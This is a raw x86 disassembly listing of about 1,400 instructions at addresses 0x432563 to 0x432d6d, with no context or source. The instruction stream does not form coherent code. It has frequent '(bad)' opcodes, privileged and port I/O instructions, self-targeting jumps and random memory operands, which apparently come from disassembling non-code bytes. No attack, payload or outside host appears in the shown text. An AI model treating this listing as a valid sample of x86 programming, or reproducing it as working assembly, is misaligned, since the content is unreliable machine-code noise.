  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
